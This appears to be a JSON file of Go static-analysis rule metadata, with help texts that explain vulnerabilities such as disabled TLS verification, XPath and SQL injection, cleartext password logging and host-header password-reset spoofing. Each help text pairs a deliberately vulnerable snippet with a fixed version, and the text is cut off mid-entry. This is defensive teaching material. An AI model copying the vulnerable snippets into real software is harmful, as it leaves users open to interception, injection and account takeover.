{
  "go/disabled-certificate-check": {
    "name": "Disabled TLS certificate check",
    "description": "If an application disables TLS certificate checking, it may be vulnerable to man-in-the-middle attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "go/disabled-certificate-check",
    "tags": [
      "security",
      "external/cwe/cwe-295"
    ],
    "filename": "f62a1678-DisabledCertificateCheck",
    "language": "go",
    "help": "# Disabled TLS certificate check\nThe field `InsecureSkipVerify` controls whether a TLS client verifies the server's certificate chain and host name. If set to `true`, the client will accept any certificate and any host name in that certificate, making it susceptible to man-in-the-middle attacks.\n\n\n## Recommendation\nDo not set `InsecureSkipVerify` to `true` except in tests.\n\n\n## Example\nThe following code snippet shows a function that performs an HTTP request over TLS with certificate verification disabled:\n\n\n```go\npackage main\n\nimport (\n\t\"crypto/tls\"\n\t\"net/http\"\n)\n\nfunc doAuthReq(authReq *http.Request) *http.Response {\n\ttr := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n\t}\n\tclient := &http.Client{Transport: tr}\n\tres, _ := client.Do(authReq)\n\treturn res\n}\n\n```\nWhile this is acceptable in a test, it should not be used in production code. Instead, certificates should be configured such that verification can be performed.\n\n\n## References\n* Package tls: [Config](https://golang.org/pkg/crypto/tls/#Config).\n* SSL.com: [Browsers and Certificate Validation](https://www.ssl.com/article/browsers-and-certificate-validation/).\n* Common Weakness Enumeration: [CWE-295](https://cwe.mitre.org/data/definitions/295.html).\n"
  },
  "go/regex/missing-regexp-anchor": {
    "name": "Missing regular expression anchor",
    "description": "Regular expressions without anchors can be vulnerable to bypassing.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "go/regex/missing-regexp-anchor",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-20"
    ],
    "filename": "7581a5e3-MissingRegexpAnchor",
    "language": "go",
    "help": "# Missing regular expression anchor\nSanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `^` or `$`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.\n\nEven if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.\n\n\n## Recommendation\nUse anchors to ensure that regular expressions match at the expected locations.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```go\npackage main\n\nimport (\n\t\"errors\"\n\t\"net/http\"\n\t\"regexp\"\n)\n\nfunc checkRedirect2(req *http.Request, via []*http.Request) error {\n\t// BAD: the host of `req.URL` may be controlled by an attacker\n\tre := \"https?://www\\\\.example\\\\.com/\"\n\tif matched, _ := regexp.MatchString(re, req.URL.String()); matched {\n\t\treturn nil\n\t}\n\treturn errors.New(\"Invalid redirect\")\n}\n\n```\nThe check with the regular expression match is, however, easy to bypass. For example, the string `http://example.com/` can be embedded in the query string component: `http://evil-example.net/?x=http://example.com/`.\n\nAddress these shortcomings by using anchors in the regular expression instead:\n\n\n```go\npackage main\n\nimport (\n\t\"errors\"\n\t\"net/http\"\n\t\"regexp\"\n)\n\nfunc checkRedirect2Good(req *http.Request, via []*http.Request) error {\n\t// GOOD: the host of `req.URL` cannot be controlled by an attacker\n\tre := \"^https?://www\\\\.example\\\\.com/\"\n\tif matched, _ := regexp.MatchString(re, req.URL.String()); matched {\n\t\treturn nil\n\t}\n\treturn errors.New(\"Invalid redirect\")\n}\n\n```\nA related mistake is to write a regular expression with multiple alternatives, but to only anchor one of the alternatives. As an example, the regular expression `^www\\.example\\.com|beta\\.example\\.com` will match the host `evil.beta.example.com` because the regular expression is parsed as `(^www\\.example\\.com)|(beta\\.example\\.com)/`, so the second alternative `beta\\.example\\.com` is not anchored at the beginning of the string.\n\nWhen checking for a domain name that may have subdomains, it is important to anchor the regular expression or ensure that the domain name is prefixed with a dot.\n\n\n```go\npackage main\n\nimport (\n\t\"regexp\"\n)\n\nfunc checkSubdomain(domain String) {\n\t// Checking strictly that the domain is `example.com`.\n\tre := \"^example\\\\.com$\"\n\tif matched, _ := regexp.MatchString(re, domain); matched {\n\t\t// domain is good.\n\t}\n\n\t// GOOD: Alternatively, check the domain is `example.com` or a subdomain of `example.com`.\n\tre2 := \"(^|\\\\.)example\\\\.com$\"\n\n\tif matched, _ := regexp.MatchString(re2, domain); matched {\n\t\t// domain is good.\n\t}\n}\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "go/incorrect-integer-conversion": {
    "name": "Incorrect conversion between integer types",
    "description": "Converting the result of `strconv.Atoi`, `strconv.ParseInt`, and `strconv.ParseUint` to integer types of smaller bit size can produce unexpected values.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "id": "go/incorrect-integer-conversion",
    "tags": [
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-681"
    ],
    "precision": "high",
    "filename": "ec16e0cd-IncorrectIntegerConversionQuery",
    "language": "go",
    "help": "# Incorrect conversion between integer types\nIf a string is parsed into an int using `strconv.Atoi`, and subsequently that int is converted into another integer type of a smaller size, the result can produce unexpected values.\n\nThis also applies to the results of `strconv.ParseInt` and `strconv.ParseUint` when the specified size is larger than the size of the type that number is converted to.\n\n\n## Recommendation\nIf you need to parse integer values with specific bit sizes, avoid `strconv.Atoi`, and instead use `strconv.ParseInt` or `strconv.ParseUint`, which also allow specifying the bit size.\n\nWhen using those functions, be careful to not convert the result to another type with a smaller bit size than the bit size you specified when parsing the number.\n\nIf this is not possible, then add upper (and lower) bound checks specific to each type and bit size (you can find the minimum and maximum value for each type in the `math` package).\n\n\n## Example\nIn the first example, assume that an input string is passed to `parseAllocateBad1` function, parsed by `strconv.Atoi`, and then converted into an `int32` type:\n\n\n```go\npackage main\n\nimport (\n\t\"strconv\"\n)\n\nfunc parseAllocateBad1(wanted string) int32 {\n\tparsed, err := strconv.Atoi(wanted)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn int32(parsed)\n}\nfunc parseAllocateBad2(wanted string) int32 {\n\tparsed, err := strconv.ParseInt(wanted, 10, 64)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn int32(parsed)\n}\n\n```\nThe bounds are not checked, so this means that if the provided number is greater than the maximum value of type `int32`, the resulting value from the conversion will be different from the actual provided value.\n\nTo avoid unexpected values, you should either use the other functions provided by the `strconv` package to parse the specific types and bit sizes as shown in the `parseAllocateGood2` function; or check bounds as in the `parseAllocateGood1` function.\n\n\n```go\npackage main\n\nimport (\n\t\"math\"\n\t\"strconv\"\n)\n\nfunc main() {\n\n}\n\nconst DefaultAllocate int32 = 256\n\nfunc parseAllocateGood1(desired string) int32 {\n\tparsed, err := strconv.Atoi(desired)\n\tif err != nil {\n\t\treturn DefaultAllocate\n\t}\n\t// GOOD: check for lower and upper bounds\n\tif parsed > 0 && parsed <= math.MaxInt32 {\n\t\treturn int32(parsed)\n\t}\n\treturn DefaultAllocate\n}\nfunc parseAllocateGood2(desired string) int32 {\n\t// GOOD: parse specifying the bit size\n\tparsed, err := strconv.ParseInt(desired, 10, 32)\n\tif err != nil {\n\t\treturn DefaultAllocate\n\t}\n\treturn int32(parsed)\n}\n\nfunc parseAllocateGood3(wanted string) int32 {\n\tparsed, err := strconv.ParseInt(wanted, 10, 32)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn int32(parsed)\n}\nfunc parseAllocateGood4(wanted string) int32 {\n\tparsed, err := strconv.ParseInt(wanted, 10, 64)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\t// GOOD: check for lower and uppper bounds\n\tif parsed > 0 && parsed <= math.MaxInt32 {\n\t\treturn int32(parsed)\n\t}\n\treturn DefaultAllocate\n}\n\n```\n\n## Example\nIn the second example, assume that an input string is passed to `parseAllocateBad2` function, parsed by `strconv.ParseInt` with a bit size set to 64, and then converted into an `int32` type:\n\n\n```go\npackage main\n\nimport (\n\t\"strconv\"\n)\n\nfunc parseAllocateBad1(wanted string) int32 {\n\tparsed, err := strconv.Atoi(wanted)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn int32(parsed)\n}\nfunc parseAllocateBad2(wanted string) int32 {\n\tparsed, err := strconv.ParseInt(wanted, 10, 64)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn int32(parsed)\n}\n\n```\nIf the provided number is greater than the maximum value of type `int32`, the resulting value from the conversion will be different from the actual provided value.\n\nTo avoid unexpected values, you should specify the correct bit size as in `parseAllocateGood3`; or check bounds before making the conversion as in `parseAllocateGood4`.\n\n\n```go\npackage main\n\nimport (\n\t\"math\"\n\t\"strconv\"\n)\n\nfunc main() {\n\n}\n\nconst DefaultAllocate int32 = 256\n\nfunc parseAllocateGood1(desired string) int32 {\n\tparsed, err := strconv.Atoi(desired)\n\tif err != nil {\n\t\treturn DefaultAllocate\n\t}\n\t// GOOD: check for lower and upper bounds\n\tif parsed > 0 && parsed <= math.MaxInt32 {\n\t\treturn int32(parsed)\n\t}\n\treturn DefaultAllocate\n}\nfunc parseAllocateGood2(desired string) int32 {\n\t// GOOD: parse specifying the bit size\n\tparsed, err := strconv.ParseInt(desired, 10, 32)\n\tif err != nil {\n\t\treturn DefaultAllocate\n\t}\n\treturn int32(parsed)\n}\n\nfunc parseAllocateGood3(wanted string) int32 {\n\tparsed, err := strconv.ParseInt(wanted, 10, 32)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn int32(parsed)\n}\nfunc parseAllocateGood4(wanted string) int32 {\n\tparsed, err := strconv.ParseInt(wanted, 10, 64)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\t// GOOD: check for lower and uppper bounds\n\tif parsed > 0 && parsed <= math.MaxInt32 {\n\t\treturn int32(parsed)\n\t}\n\treturn DefaultAllocate\n}\n\n```\n\n## References\n* Wikipedia [Integer overflow](https://en.wikipedia.org/wiki/Integer_overflow).\n* Go language specification [Integer overflow](https://golang.org/ref/spec#Integer_overflow).\n* Documentation for [strconv.Atoi](https://golang.org/pkg/strconv/#Atoi).\n* Documentation for [strconv.ParseInt](https://golang.org/pkg/strconv/#ParseInt).\n* Documentation for [strconv.ParseUint](https://golang.org/pkg/strconv/#ParseUint).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-681](https://cwe.mitre.org/data/definitions/681.html).\n"
  },
  "go/xml/xpath-injection": {
    "name": "XPath injection",
    "description": "Building an XPath expression from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "go/xml/xpath-injection",
    "tags": [
      "security",
      "external/cwe/cwe-643"
    ],
    "filename": "7b27715f-XPathInjection",
    "language": "go",
    "help": "# XPath injection\nIf an XPath expression is built using string concatenation, and the components of the concatenation include user input, a user is likely to be able to create a malicious XPath expression.\n\n\n## Recommendation\nIf user input must be included in an XPath expression, pre-compile the query and use variable references to include the user input.\n\nFor example, when using the `github.com/ChrisTrenkamp/goxpath` API, you can do this by creating a function that takes an `*goxpath.Opts` structure. In this structure you can then set the values of the variable references. This function can then be specified when calling `Exec()`, `Exec{Bool|Num|Node}()`, `ParseExec()`, or `MustExec()`.\n\n\n## Example\nIn the first example, the code accepts a username specified by the user, and uses this unvalidated and unsanitized value in an XPath expression. This is vulnerable to the user providing special characters or string sequences that change the meaning of the XPath expression to search for different values.\n\nIn the second example, the XPath expression is a hard-coded string that specifies some variables, which are safely resolved at runtime using the `goxpath.Opts` structure.\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\n\t\"github.com/ChrisTrenkamp/goxpath\"\n\t\"github.com/ChrisTrenkamp/goxpath/tree\"\n)\n\nfunc main() {}\n\nfunc processRequest(r *http.Request, doc tree.Node) {\n\tr.ParseForm()\n\tusername := r.Form.Get(\"username\")\n\n\t// BAD: User input used directly in an XPath expression\n\txPath := goxpath.MustParse(\"//users/user[login/text()='\" + username + \"']/home_dir/text()\")\n\tunsafeRes, _ := xPath.ExecBool(doc)\n\tfmt.Println(unsafeRes)\n\n\t// GOOD: Value of parameters is defined here instead of directly in the query\n\topt := func(o *goxpath.Opts) {\n\t\to.Vars[\"username\"] = tree.String(username)\n\t}\n\t// GOOD: Uses parameters to avoid including user input directly in XPath expression\n\txPath = goxpath.MustParse(\"//users/user[login/text()=$username]/home_dir/text()\")\n\tsafeRes, _ := xPath.ExecBool(doc, opt)\n\tfmt.Println(safeRes)\n}\n\n```\n\n## References\n* OWASP: [Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection).\n* OWASP: [XPath Injection](https://www.owasp.org/index.php/XPATH_Injection).\n* Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).\n"
  },
  "go/uncontrolled-allocation-size": {
    "name": "Slice memory allocation with excessive size value",
    "description": "Allocating memory for slices with the built-in make function from user-controlled sources can lead to a denial of service.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "go/uncontrolled-allocation-size",
    "tags": [
      "security",
      "external/cwe/cwe-770"
    ],
    "filename": "82ad2c8e-UncontrolledAllocationSize",
    "language": "go",
    "help": "# Slice memory allocation with excessive size value\nUsing untrusted input to allocate slices with the built-in `make` function could lead to excessive memory allocation and potentially cause the program to crash due to running out of memory. This vulnerability could be exploited to perform a denial-of-service attack by consuming all available server resources.\n\n\n## Recommendation\nImplement a maximum allowed value for size allocations with the built-in `make` function to prevent excessively large allocations.\n\n\n## Example\nIn the following example snippet, the `n` parameter is user-controlled.\n\nIf the external user provides an excessively large value, the application allocates a slice of size `n` without further verification, potentially exhausting all the available memory.\n\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"strconv\"\n)\n\nfunc OutOfMemoryBad(w http.ResponseWriter, r *http.Request) {\n\tquery := r.URL.Query()\n\n\tqueryStr := query.Get(\"n\")\n\tcollectionSize, err := strconv.Atoi(queryStr)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\treturn\n\t}\n\n\tresult := make([]string, collectionSize)\n\tfor i := 0; i < collectionSize; i++ {\n\t\tresult[i] = fmt.Sprintf(\"Item %d\", i+1)\n\t}\n\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tjson.NewEncoder(w).Encode(result)\n}\n\n```\nOne way to prevent this vulnerability is by implementing a maximum allowed value for the user-controlled input, as seen in the following example:\n\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"strconv\"\n)\n\nfunc OutOfMemoryGood(w http.ResponseWriter, r *http.Request) {\n\tquery := r.URL.Query()\n\tMaxValue := 6\n\tqueryStr := query.Get(\"n\")\n\tcollectionSize, err := strconv.Atoi(queryStr)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\treturn\n\t}\n\tif collectionSize < 0 || collectionSize > MaxValue {\n\t\thttp.Error(w, \"Bad request\", http.StatusBadRequest)\n\t\treturn\n\t}\n\tresult := make([]string, collectionSize)\n\tfor i := 0; i < collectionSize; i++ {\n\t\tresult[i] = fmt.Sprintf(\"Item %d\", i+1)\n\t}\n\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tjson.NewEncoder(w).Encode(result)\n}\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n"
  },
  "go/incomplete-url-scheme-check": {
    "name": "Incomplete URL scheme check",
    "description": "Checking for the \"javascript:\" URL scheme without also checking for \"vbscript:\" and \"data:\" suggests a logic error or even a security vulnerability.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "go/incomplete-url-scheme-check",
    "tags": [
      "security",
      "correctness",
      "external/cwe/cwe-020"
    ],
    "filename": "7581a5e3-IncompleteUrlSchemeCheck",
    "language": "go",
    "help": "# Incomplete URL scheme check\nURLs with the special scheme `javascript` can be used to encode JavaScript code to be executed when the URL is visited. While this is a powerful mechanism for creating feature-rich and responsive web applications, it is also a potential security risk: if the URL comes from an untrusted source, it might contain harmful JavaScript code. For this reason, many frameworks and libraries first check the URL scheme of any untrusted URL, and reject URLs with the `javascript` scheme.\n\nHowever, the `data` and `vbscript` schemes can be used to represent executable code in a very similar way, so any validation logic that checks against `javascript`, but not against `data` and `vbscript`, is likely to be insufficient.\n\n\n## Recommendation\nAdd checks covering both `data:` and `vbscript:`.\n\n\n## Example\nThe following function validates a (presumably untrusted) URL `urlstr`. If its scheme is `javascript`, the harmless placeholder URL `about:blank` is returned to prevent code injection; otherwise `urlstr` itself is returned.\n\n\n```go\npackage main\n\nimport \"net/url\"\n\nfunc sanitizeUrl(urlstr string) string {\n\tu, err := url.Parse(urlstr)\n\tif err != nil || u.Scheme == \"javascript\" {\n\t\treturn \"about:blank\"\n\t}\n\treturn urlstr\n}\n\n```\nWhile this check provides partial projection, it should be extended to cover `data` and `vbscript` as well:\n\n\n```go\npackage main\n\nimport \"net/url\"\n\nfunc sanitizeUrlGod(urlstr string) string {\n\tu, err := url.Parse(urlstr)\n\tif err != nil || u.Scheme == \"javascript\" || u.Scheme == \"data\" || u.Scheme == \"vbscript\" {\n\t\treturn \"about:blank\"\n\t}\n\treturn urlstr\n}\n\n```\n\n## References\n* WHATWG: [URL schemes](https://wiki.whatwg.org/wiki/URL_schemes).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "go/clear-text-logging": {
    "name": "Clear-text logging of sensitive information",
    "description": "Logging sensitive information without encryption or hashing can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "go/clear-text-logging",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-315",
      "external/cwe/cwe-359"
    ],
    "filename": "eaf87070-CleartextLogging",
    "language": "go",
    "help": "# Clear-text logging of sensitive information\nSensitive information that is logged unencrypted is accessible to an attacker who gains access to the logs.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted or obfuscated before being logged.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\nBe aware that external processes often store the standard out and standard error streams of the application, causing logged sensitive information to be stored.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) in plain text:\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc serve() {\n\thttp.HandleFunc(\"/register\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tuser := r.Form.Get(\"user\")\n\t\tpw := r.Form.Get(\"password\")\n\n\t\tlog.Printf(\"Registering new user %s with password %s.\\n\", user, pw)\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\nInstead, the credentials should be encrypted, obfuscated, or omitted entirely:\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n)\n\nfunc serve1() {\n\thttp.HandleFunc(\"/register\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tuser := r.Form.Get(\"user\")\n\t\tpw := r.Form.Get(\"password\")\n\n\t\tlog.Printf(\"Registering new user %s.\\n\", user)\n\n\t\t// ...\n\t\tuse(pw)\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* OWASP: [Password Plaintext Storage](https://www.owasp.org/index.php/Password_Plaintext_Storage).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n"
  },
  "go/stack-trace-exposure": {
    "name": "Information exposure through a stack trace",
    "description": "Information from a stack trace propagates to an external user. Stack traces can unintentionally reveal implementation details that are useful to an attacker for developing a subsequent exploit.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 5.4,
    "precision": "high",
    "id": "go/stack-trace-exposure",
    "tags": [
      "security",
      "external/cwe/cwe-209",
      "external/cwe/cwe-497"
    ],
    "filename": "9bb4e573-StackTraceExposure",
    "language": "go",
    "help": "# Information exposure through a stack trace\nSoftware developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. In particular, stack traces can tell the developer more about the sequence of events that led to a failure, as opposed to merely the final state of the software when the error occurred.\n\nUnfortunately, the same information can be useful to an attacker. The sequence of class names in a stack trace can reveal the structure of the application as well as any internal components it relies on.\n\n\n## Recommendation\nSend the user a more generic error message that reveals less information. Either suppress the stack trace entirely, or log it only on the server.\n\n\n## Example\nIn the following example, a panic is handled in two different ways. In the first version, labeled BAD, a detailed stack trace is written to a user-facing HTTP response object, which may disclose sensitive information. In the second version, the error message is logged only on the server. That way, the developers can still access and use the error log, but remote users will not see the information.\n\n\n```go\npackage example\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t\"runtime\"\n)\n\nfunc handlePanic(w http.ResponseWriter, r *http.Request) {\n\tbuf := make([]byte, 2<<16)\n\tbuf = buf[:runtime.Stack(buf, true)]\n\t// BAD: printing a stack trace back to the response\n\tw.Write(buf)\n\t// GOOD: logging the response to the server and sending\n\t// a more generic message.\n\tlog.Printf(\"Panic: %s\", buf)\n\tw.Write([]byte(\"An unexpected runtime error occurred\"))\n}\n\n```\n\n## References\n* OWASP: [Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling).\n* Common Weakness Enumeration: [CWE-209](https://cwe.mitre.org/data/definitions/209.html).\n* Common Weakness Enumeration: [CWE-497](https://cwe.mitre.org/data/definitions/497.html).\n"
  },
  "go/suspicious-character-in-regex": {
    "name": "Suspicious characters in a regular expression",
    "description": "If a literal bell character or backspace appears in a regular expression, the start of text or word boundary may have been intended.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "go/suspicious-character-in-regex",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-20"
    ],
    "filename": "7581a5e3-SuspiciousCharacterInRegexp",
    "language": "go",
    "help": "# Suspicious characters in a regular expression\nWhen a character in a string literal or regular expression literal is preceded by a backslash, it is interpreted as part of an escape sequence. For example, the escape sequence `\\n` in a string literal corresponds to a single `newline` character, and not the `\\` and `n` characters. There are two Go escape sequences that could produce surprising results. First, `regexp.Compile(\"\\a\")` matches the bell character, whereas `regexp.Compile(\"\\\\A\")` matches the start of text and `regexp.Compile(\"\\\\a\")` is a Vim (but not Go) regular expression matching any alphabetic character. Second, `regexp.Compile(\"\\b\")` matches a backspace, whereas `regexp.Compile(\"\\\\b\")` matches the start of a word. Confusing one for the other could lead to a regular expression passing or failing much more often than expected, with potential security consequences. Note this is less of a problem than in some other languages because in Go, only valid escape sequences are accepted, both in an ordinary string (for example, `s := \"\\k\"` will not compile as there is no such escape sequence) and in regular expressions (for example, `regexp.MustCompile(\"\\\\k\")` will panic as `\\k` does not refer to a character class or other special token according to Go's regular expression grammar).\n\n\n## Recommendation\nEnsure that the right number of backslashes is used when escaping characters in strings and regular expressions.\n\n\n## Example\nThe following example code fails to check for a forbidden word in an input string:\n\n\n```go\npackage main\n\nimport \"regexp\"\n\nfunc broken(hostNames []byte) string {\n\tvar hostRe = regexp.MustCompile(\"\\bforbidden.host.org\")\n\tif hostRe.Match(hostNames) {\n\t\treturn \"Must not target forbidden.host.org\"\n\t} else {\n\t\t// This will be reached even if hostNames is exactly \"forbidden.host.org\",\n\t\t// because the literal backspace is not matched\n\t\treturn \"\"\n\t}\n}\n\n```\nThe check does not work, but can be fixed by escaping the backslash:\n\n\n```go\npackage main\n\nimport \"regexp\"\n\nfunc fixed(hostNames []byte) string {\n\tvar hostRe = regexp.MustCompile(`\\bforbidden.host.org`)\n\tif hostRe.Match(hostNames) {\n\t\treturn \"Must not target forbidden.host.org\"\n\t} else {\n\t\t// hostNames definitely doesn't contain a word \"forbidden.host.org\", as \"\\\\b\"\n\t\t// is the start-of-word anchor, not a literal backspace.\n\t\treturn \"\"\n\t}\n}\n\n```\nAlternatively, you can use backtick-delimited raw string literals. For example, the `\\b` in ``` regexp.Compile(`hello\\bworld`) ``` matches a word boundary, not a backspace character, as within backticks `\\b` is not an escape sequence.\n\n\n## References\n* golang.org: [Overview of the Regexp package](https://golang.org/pkg/regexp/).\n* Google: [Syntax of regular expressions accepted by RE2](https://github.com/google/re2/wiki/Syntax).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "go/email-injection": {
    "name": "Email content injection",
    "description": "Incorporating untrusted input directly into an email message can enable content spoofing, which in turn may lead to information leaks and other security issues.",
    "id": "go/email-injection",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "tags": [
      "security",
      "external/cwe/cwe-640"
    ],
    "precision": "high",
    "filename": "2bd31ae5-EmailInjection",
    "language": "go",
    "help": "# Email content injection\nUsing untrusted input to construct an email can cause multiple security vulnerabilities. For instance, inclusion of an untrusted input in an email body may allow an attacker to conduct cross-site scripting (XSS) attacks, while inclusion of an HTTP header may allow a full account compromise as shown in the example below.\n\n\n## Recommendation\nAny data which is passed to an email subject or body must be sanitized before use.\n\n\n## Example\nIn the following example snippet, the `host` field is user controlled.\n\nA malicious user can send an HTTP request to the targeted website, but with a Host header that refers to their own website. This means the emails will be sent out to potential victims, originating from a server they trust, but with links leading to a malicious website.\n\nIf the email contains a password reset link, and the victim clicks the link, the secret reset token will be leaked to the attacker. Using the leaked token, the attacker can then construct the real reset link and use it to change the victim's password.\n\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n\t\"net/smtp\"\n)\n\nfunc mail(w http.ResponseWriter, r *http.Request) {\n\thost := r.Header.Get(\"Host\")\n\ttoken := backend.getUserSecretResetToken(email)\n\tbody := \"Click to reset password: \" + host + \"/\" + token\n\tsmtp.SendMail(\"test.test\", nil, \"from@from.com\", nil, []byte(body))\n}\n\n```\nOne way to prevent this is to load the host name from a trusted configuration file instead.\n\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n\t\"net/smtp\"\n)\n\nfunc mailGood(w http.ResponseWriter, r *http.Request) {\n\thost := config.Get(\"Host\")\n\ttoken := backend.getUserSecretResetToken(email)\n\tbody := \"Click to reset password: \" + host + \"/\" + token\n\tsmtp.SendMail(\"test.test\", nil, \"from@from.com\", nil, []byte(body))\n}\n\n```\n\n## References\n* OWASP: [Content Spoofing](https://owasp.org/www-community/attacks/Content_Spoofing) .\n* Common Weakness Enumeration: [CWE-640](https://cwe.mitre.org/data/definitions/640.html).\n"
  },
  "go/unsafe-quoting": {
    "name": "Potentially unsafe quoting",
    "description": "If a quoted string literal is constructed from data that may itself contain quotes, the embedded data could (accidentally or intentionally) change the structure of the overall string.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 9.3,
    "precision": "high",
    "id": "go/unsafe-quoting",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-089",
      "external/cwe/cwe-094"
    ],
    "filename": "a50807d0-StringBreak",
    "language": "go",
    "help": "# Potentially unsafe quoting\nCode that constructs a quoted string literal containing user-provided data needs to ensure that this data does not itself contain a quote. Otherwise the embedded data could (accidentally or intentionally) terminate the string literal early and thereby change the structure of the overall string, with potentially severe consequences. If, for example, the string is later used as part of an operating-system command or database query, an attacker may be able to craft input data that injects a malicious command.\n\n\n## Recommendation\nSanitize the embedded data appropriately to ensure quotes are escaped, or use an API that does not rely on manually constructing quoted substrings. Make sure to use the appropriate escaping mechanism, for example, double quoting for SQL strings or backslash escaping for shell commands. When using backslash escaping, the backslash character itself must also be escaped.\n\n\n## Example\nIn the following example, assume that `version` is an object from an untrusted source. The code snippet first uses `json.Marshal` to serialize this object into a string, and then embeds it into a SQL query built using the Squirrel library.\n\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\tsq \"github.com/Masterminds/squirrel\"\n)\n\nfunc save(id string, version interface{}) {\n\tversionJSON, _ := json.Marshal(version)\n\tsq.StatementBuilder.\n\t\tInsert(\"resources\").\n\t\tColumns(\"resource_id\", \"version_md5\").\n\t\tValues(id, sq.Expr(fmt.Sprintf(\"md5('%s')\", versionJSON))).\n\t\tExec()\n}\n\n```\nNote that JSON encoding does not escape single quotes in any way, so this code is vulnerable: any single-quote character in `version` will prematurely close the surrounding string literal, changing the structure of the SQL expression being constructed. This could be exploited to mount a SQL injection attack.\n\nTo fix this vulnerability, use the placeholder syntax from Squirrel's structured API for building queries, which avoids the need to explicitly construct a quoted string.\n\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\tsq 